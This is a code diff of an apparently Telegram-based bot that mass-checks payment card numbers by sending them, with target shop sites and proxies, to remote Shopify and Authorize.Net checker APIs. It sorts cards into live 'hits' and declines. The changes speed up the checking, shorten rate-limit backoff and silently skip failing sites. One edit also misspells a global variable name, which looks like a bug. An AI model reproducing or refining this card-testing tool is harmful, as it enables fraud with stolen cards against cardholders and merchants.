@@ -86,14 +86,14 @@ JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
 # روابط الـ APIs النشطة
-SHOPIFY_API_URL_1 = 'https://web-production-2fa5c.up.railway.app/check'
+SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
 # التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 10  
+DELAY = 3.0  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -532,6 +532,7 @@ async def get_shopify_sites():
     
     return _CACHED_SHOPIFY_SITES
 
+# دالة مطورة لتحديد جميع أنواع أخطاء البوابة أو المواقع
 def is_dead_site_error(err):
     if not err: return True
     e = unsf(str(err)).lower()
@@ -540,7 +541,9 @@ def is_dead_site_error(err):
         'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
         'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
         '504', '502', '503', '429', 'tunnel', 'connection close', 'format error',
-        '404', 'login', 'requires login'
+        '404', 'login', 'requires login', '401', 'unauthorized', 'site error', 'forbidden',
+        'login required', 'access denied', 'password protected', 'failed to fetch',
+        'api error', 'api http', 'internal server error', '500'
     ]
     return any(k in e for k in bad_keywords)
 
@@ -649,7 +652,6 @@ async def get_bin_info(bin_code, session=None):
         "Accept": "application/json"
     }
     
-    # 1. محاولة جلب الـ BIN من موقع Antipublic
     try:
         url1 = f"https://bins.antipublic.cc/bins/{b6}"
         async def fetch1(s):
@@ -674,7 +676,6 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # 2. محاولة جلب الـ BIN من موقع HandyAPI (مع إصلاح خطأ الـ None)
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
@@ -699,7 +700,6 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # 3. مصدر احتياطي إضافي (Binlist)
     try:
         url3 = f"https://lookup.binlist.net/{b6}"
         async def fetch3(s):
@@ -724,7 +724,6 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # 4. إذا فشلت كل المواقع، ارجع القيمة الافتراضية
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
 
 # ====================== SHOPIFY GATEWAY ENGINE ======================
@@ -742,7 +741,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         site_encoded = quote(site_param)
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
-        
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}&amount=5&amt=5&price=5"
         
         headers = {
@@ -751,11 +749,11 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
-            
             gt = "Shopify"
             pr = "$5.00"
             rm = ""
             
+            # إرجاع خطأ الموقع صراحة إذا كانت حالة HTTP غير ناجحة (مثل 504، 401، 403، 404)
             if resp.status != 200:
                 return {'status': 'Site Error', 'message': f'API HTTP {resp.status}', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
@@ -780,7 +778,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             if any(k in clean_rm for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
-            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504']):
+            if is_dead_site_error(rm) or any(k in clean_rm for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504', '401', '404', 'login', 'requires login', 'unauthorized']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                 
             if 'insufficient' in clean_rm or 'funds' in clean_rm or 'balance' in clean_rm:
@@ -815,7 +813,6 @@ async def check_authnet_api(card, proxy, session):
         
         async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
-            
             pr = None
             try:
                 rj = json.loads(text_data)
@@ -846,7 +843,7 @@ async def check_authnet_api(card, proxy, session):
             if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                 
-            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable']):
+            if any(k in clean_rm for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable', '504', '502', '503', '401', '404', 'login']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                 
             return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
@@ -877,6 +874,9 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     last_res = r
                     continue
                 return r
+            # إذا فشلت كل محاولات AuthNet بسبب مشاكل اتصال أو API نرجع تخطي صامت
+            if last_res.get('status') == 'Site Error':
+                return {'status': 'Silent_Skip', 'card': card}
             return last_res
 
         lr = None
@@ -902,10 +902,10 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
                 status = r.get('status')
                 msg = str(r.get('message', '')).lower()
-                
                 clean_msg = unsf(msg).lower()
                 
-                if '404' in clean_msg or 'login' in clean_msg:
+                # إذا تطلب الموقع تسجيل دخول أو تسبب بـ 404/401، يتم حظره فوراً برفع عداد أخطائه
+                if any(k in clean_msg for k in ['404', 'login', 'requires login', '401', 'unauthorized', 'password', 'protected']):
                     _SITE_ERRORS_COUNT[s] = _MAX_SITE_ERRORS + 5 
                     lr = r
                     continue 
@@ -917,7 +917,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                     continue
 
                 if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
-                    await asyncio.sleep(random.uniform(1.0, 1.8))
+                    await asyncio.sleep(random.uniform(0.5, 1.2))
                     lr = r
                     continue
 
@@ -934,10 +934,15 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 
             lr = r
             
+        # إذا انتهت كل المحاولات وكانت النتيجة الأخيرة هي خطأ موقع، نرجع تخطي صامت تماماً
+        if lr and (lr.get('status') == 'Site Error' or is_dead_site_error(lr.get('message', ''))):
+            return {'status': 'Silent_Skip', 'card': card}
+            
         if lr: return lr
-        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
+        return {'status': 'Silent_Skip', 'card': card}
+        
     except Exception as e:
-        return {'status': 'Site Error', 'message': f'Fatal Retry Error: {str(e)[:40]}', 'card': card}
+        return {'status': 'Silent_Skip', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
@@ -1024,7 +1029,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
+    global _MAINTENANCE_MODE, _CACHED_SHOOPY_SITES, _LAST_SITES_FETCH
     if not update.message: return
     uid = update.effective_user.id
     USER_LAST_REQ[uid] = time.time()
@@ -1572,6 +1577,12 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     if is_stopped(): break 
                     c_el = time.time() - c_st
                     status = res.get('status', 'Dead')
+                    
+                    # تعديل: إذا كانت نتيجة الفحص تخطي صامت (بسبب أخطاء المواقع المتكررة)
+                    if status == 'Silent_Skip':
+                        chk += 1  # نزيد العداد العام ليكتمل الفحص بدون تعليق
+                        continue  # نتجاهل العملية تماماً بصمت (بدون زيادة الأخطاء وبدون تعديل آخر استجابة)
+                        
                     chk += 1
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                     last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
@@ -1588,7 +1599,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     else: 
                         dec += 1
                 except asyncio.CancelledError: break
-                except Exception: err += 1; chk += 1
+                except Exception: 
+                    err += 1
+                    chk += 1
                 finally:
                     queue.task_done()
             if not is_stopped(): 
